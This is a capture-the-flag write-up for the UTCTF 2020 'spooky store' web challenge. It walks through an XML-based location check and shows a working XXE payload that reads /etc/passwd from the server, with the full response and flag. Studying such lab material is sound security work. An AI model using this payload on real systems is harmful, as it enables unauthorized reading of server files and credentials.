# UTCTF 2020 – spooky store

* **Category:** web
* **Points:** 50

## Challenge

> It's a simple webpage with 3 buttons, you got this :)
> 
> http://web1.utctf.live:5005/
> 
> by matt

## Solution

The web page sends data via XML envelops, using two Javascript files, when buttons are pressed.

The first script (`http://web1.utctf.live:5005/static/js/xmlLocationCheckPayload.js`) crafts the XML envelope.

```javascript
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<locationCheck>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</locationCheck>';
    return xml;
}
```

The second script (`http://web1.utctf.live:5005/static/js/locationCheck.js`) sends the XML envelope and reads the answer.

```javascript
document.querySelectorAll('.locationForm').forEach(item => {
    item.addEventListener("submit", function(e) {
        checkLocation(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
});
function checkLocation(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : "Could not fetch nearest location :("
            )
            .then(res => document.getElementById("locationResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

A normal interaction is like the following.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 93
Connection: close

<?xml version="1.0" encoding="UTF-8"?><locationCheck><productId>1</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:04:35 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 60
Connection: Close

The nearest coordinates to you are: 25.0000Â° N, 71.0000Â° W
```

Passing a wrong `productId` will trigger the following error message.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 93
Connection: close

<?xml version="1.0" encoding="UTF-8"?><locationCheck><productId>0</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:05:11 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 20
Connection: Close

Invalid ProductId: 0
```

The passed parameter is reflected to the response, so if the system is vulnerable to XXE you can read files on the server.

You can craft a payload like the following.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 176
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><locationCheck><productId>&xxe;</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:09:12 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 1234
Connection: Close

Invalid ProductId: root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
utctf:x:1337:utflag{n3xt_y3ar_go1ng_bl1nd}
```

And discover the flag into `/etc/passwd`.

```
utflag{n3xt_y3ar_go1ng_bl1nd}
```